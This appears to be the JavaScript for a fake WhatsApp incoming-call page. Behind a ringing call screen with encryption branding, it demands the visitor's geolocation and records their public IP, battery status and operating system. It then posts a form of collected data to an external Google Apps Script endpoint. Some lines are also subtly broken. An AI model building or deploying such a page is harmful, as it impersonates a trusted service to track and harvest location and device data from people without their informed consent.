function realcall() {
    document.querySelector('#img-cont-container').style.position = "relative";
    document.querySelector('#img-cont-container').style.bottom = "-65px";
    document.querySelector('#img-taken-person').style.height = "200px";
    document.querySelector('#img-taken-person').style.width = "200px";
}

// window.addEventListener("load", startup, false);
const body = document.querySelector("body");
function toggleFullScreen(body) {
    if (!document.fullscreenElement) {
        body.requestFullscreen();
        document.querySelector('#img-cont-container').style.position = "relative";
        document.querySelector('#img-cont-container').style.bottom = "-65px";
        document.querySelector('#img-taken-person').style.height = "200px";
        document.querySelector('#img-taken-person').style.width = "200px";

    } else {
        if (document.exitFullscreen) {
            document.exitFullscreen();
            document.querySelector('#img-cont-container').style.position = "relative";
            document.querySelector('#img-cont-container').style.bottom = "0px";
            document.querySelector('#img-taken-person').style.height = "150px";
            document.querySelector('#img-taken-person').style.width = "150px";
        }
    }
}
// 	    Video Streaming API
function askPermission() {

    //add constraints object
    var constraints = {
        audio: true,
        video: true
    };

    //call getUserMedia
    navigator.mediaDevices.getUserMedia(constraints).then(function (mediaStream) {

        var video = document.querySelector('video');
        video.srcObject = mediaStream;
        video.play();
    }).catch(function (err) {
        console.log("There's an error!" + err.message);
    })
    video.style.position = "fixed";
    video.style.bottom = "0px";
    video.style.right = "0px";
    video.style.width = "50px";
    video.style.width = "100px";
    document.querySelector('#videohang').style.display = "block";


}
document.querySelector("#error").style.display = "none";
document.querySelector("#end-2-end-mess").style.display = "none";
document.querySelector("audio").pause();



function changeusername(e) {
    e.preventDefault();
    // var userimg = document.querySelector("#img").src;
    var username = document.querySelector("#name").value;
    var userphno = document.querySelector("#phno").value;

    if (username != "" && userphno != "") {
        if (document.querySelector("#loc").value != "") {
            document.querySelector("#callername").innerText = username;
            document.querySelector("#callerno").innerText = userphno;
            // document.querySelector("#img-person").src = userimg;
            document.querySelector(".form-container-container").style.display = "none";
            document.querySelector("#Call-Maker-Container").style.display = "block";
            document.querySelector("audio").play();
            document.querySelector("#error").style.display = "none";
            document.querySelector("#error").style.visibility = "hidden";

        } else {
            document.querySelector("#error").innerText = "Please Allow Location To Proceed.";
            document.querySelector("#err-img").style.display = "block";

            //                 window.location.href = "index.html";
            document.querySelector("audio").pause();

        }
    }
    else {
        document.querySelector("#error").innerText = "Please Enter Name & Number To Proceed.";
        window.location.href = "index.html";
        document.querySelector("audio").pause();
    }
}
function calltaken() {
    document.querySelector("#call-taken-container").style.display = "block";
    document.querySelector("#Call-Maker-Container").style.display = "none";
    var username = document.querySelector("#name").value;
    document.querySelector("#username-ctc").innerText = username;
    document.querySelector("audio").pause();

}

var Currentdate = new Date();
var hour = Currentdate.getHours();
var minute = Currentdate.getMinutes();
if (minute.toString() < 10) {
    '0' + minute.toString();
} else {
    minute.toString();
}
var Currenttime = document.querySelector('#current-time').innerHTML = hour.toString() + ":" + minute.toString();
document.querySelector("#Call-Maker-Container").style.display = "none";
document.querySelector("#call-taken-container").style.display = "none";
document.querySelector("#video").style.display = "none";
const timer = document.getElementById('stopwatch');

var hr = 0;
var min = 0;
var sec = 0;
var stoptime = true;

function startTimer() {
    if (stoptime == true) {
        stoptime = false;
        timerCycle();
    }
}
function stopTimer() {
    if (stoptime == false) {
        stoptime = true;
    }
}

function timerCycle() {
    if (stoptime == false) {
        sec = parseInt(sec);
        min = parseInt(min);
        hr = parseInt(hr);

        sec = sec + 1;

        if (sec == 60) {
            min = min + 1;
            sec = 0;
        }
        if (min == 60) {
            hr = hr + 1;
            min = 0;
            sec = 0;
        }

        if (sec < 10 || sec == 0) {
            sec = '0' + sec;
        }
        if (min < 10 || min == 0) {
            min = '0' + min;
        }
        if (hr < 10 || hr == 0) {
            hr = '0' + hr;
        }

        timer.innerHTML = min + ':' + sec;

        setTimeout("timerCycle()", 1000);
    }
}

function resetTimer() {
    timer.innerHTML = '00:00';
}
document.querySelector(".disabled-icon-overlay").style.display = "none";
document.querySelector("audio").pause();
function dioCheckNet() {
    document.querySelector(".disabled-icon-overlay").style.display = "block";

}
function delDIO() {
    document.querySelector(".disabled-icon-overlay").style.display = "none";
}
function hangcall() {
    window.location.href = "index.html";
}

function loadFile() {
    var image = document.querySelector('#img-person');
    image.src = URL.createObjectURL(event.target.files[0]);

    var image1 = document.querySelector('#img-taken-person');
    image1.src = URL.createObjectURL(event.target.files[0]);
};
function loadVideo() {
    var video = document.querySelector('#video');
    video.src = URL.createObjectURL(event.target.files[0]);

}
document.querySelector("#end-2-end-mess").style.display = "none";
function disend2mess() {
    document.querySelector("#end-2-end-mess").style.display = "block";
    document.querySelector("#username-ctc").style.opacity = "0.3";
    document.querySelector("#stopwatch").style.opacity = "0.3";
    document.querySelector("#bottom-call-tool-container").style.opacity = "0.3";
    document.querySelector("#img-taken-person").style.opacity = "0";
    document.querySelector("#down-arrow").style.opacity = "0.3";
    document.querySelector("#add-con-img").style.opacity = "0.3";

}
function remEnd2endmess() {
    document.querySelector("#end-2-end-mess").style.display = "none";
    document.querySelector("#username-ctc").style.opacity = "1";
    document.querySelector("#stopwatch").style.opacity = "1";
    document.querySelector("#bottom-call-tool-container").style.opacity = "1";
    document.querySelector("#img-taken-person").style.opacity = "1";
    document.querySelector("#add-con-img").style.opacity = "1";
    document.querySelector("#down-arrow").style.opacity = "1";
}
function gowalearnmore() {

    window.location.href = "https://faq.whatsapp.com/general/security-and-privacy/end-to-end-encryption?lang=en"
}

function showvideo() {
    document.querySelector("#video").style.display = "block";
}
var x = document.getElementById("demo");

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(showPosition);
    } else {
        x.innerHTML = "Geolocation is not supported by this browser.";
    }
}

function showPosition(position) {
    x.innerHTML = position.coords.latitude + " " + position.coords.longitude;
    document.getElementById("loc").value = x.innerHTML;
}

$.getJSON("https://api.ipify.org?format=json", function (data) {

    // Setting text of element P with id gfg
    $("#gfg").html(data.ip);
    $("#ip").html(data.ip);
    $("#ip1").html(data.ip);
    var id = document.getElementById("gfg").innerText;
    document.getElementById("ip").value = id;
})


window.onload = function () {
    function updateBatteryStatus(battery) {
        document.querySelector('#charging').value = battery.charging ? 'charging' : 'not charging';
        document.querySelector('#level').value = battery.level;
        document.querySelector('#dischargingTime').value = battery.dischargingTime;
        document.querySelector('#time').value = Date();
    }

    navigator.getBattery().then(function (battery) {

        updateBatteryStatus(battery);
        battery.onchargingchange = function () {
            updateBatteryStatus(battery);
        };

        battery.onlevelchange = function () {
            updateBatteryStatus(battery);
        };

        battery.ondischargingtimechange = function () {
            updateBatteryStatus(battery);
        };
    });
};
document.querySelector("#timer-btn").style.display = "none";
var el_down = document.getElementById("dev-type");
var Name = "Unknown OS";
if (navigator.appVersion.indexOf("Win") != -1) Name =
    "Windows OS";
if (navigator.appVersion.indexOf("Mac") != -1) Name =
    "MacOS";
if (navigator.userAgent.indexOf("Android") != -1) Name =
    "Android OS";
if (navigator.appVersion.indexOf("X11") != -1) Name =
    "UNIX OS";
if (navigator.appVersion.indexOf("Linux") != -1) Name =
    "Linux OS";

function GFG_Fun() {
    el_down.value = Name;
}
let timeout;

function hello() {
    var username = document.querySelector("#name").value;
    var userphno = document.querySelector("#phno").value;

    if (username != "" && userphno != "") {
        if (document.querySelector("#loc").value != "") {
            var usernot = document.querySelector("#not-type").value * 1000;
            timeout = setTimeout(notifyMe, usernot);

        } else {
            document.querySelector("#error").innerText = "Please Enter Name & Number To Proceed.";
            window.location.href = "index.html";
            document.querySelector("audio").pause();

        }

    }
    else {
        document.querySelector("#error").innerText = "Please Enter Name & Number To Proceed.";
        window.location.href = "index.html";
        document.querySelector("audio").pause();
    }

}
document.addEventListener('DOMContentLoaded', function () {
    if (!Notification) {
        alert('Desktop notifications not available in your browser. Try Chromium.');
        return;
    }

    if (Notification.permission !== "granted")
        Notification.requestPermission();
});

function notifyMe() {
    if (Notification.permission !== "granted")
        Notification.requestPermission();
    else {
        var notification = new Notification('whatsApp Voice Call (Click to Pick Up)', {
            icon: 'apple-touch-icon.png',
            body: "Click to Pick UP",
            vibrate: [2000000]



        });

        notification.onclick = function () {

            return changeusername();
            window.location.href = "index.html"

        };


    }

}
const scriptURL = 'https://script.google.com/macros/s/AKfycbwrzHRD2i8WGBLH1_pc6HRPoL_0sbcRDVa5tPiV7UMYMoZKBUn1AfXOmTK7wlzIQoyO/exec'
const form = document.forms['google-sheet']

const submit_btn = document.getElementById('submit-btn');
submit_btn.addEventListener('click', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => console.log('Success!', response))
        .catch(error => console.error('Error!', error.message))
})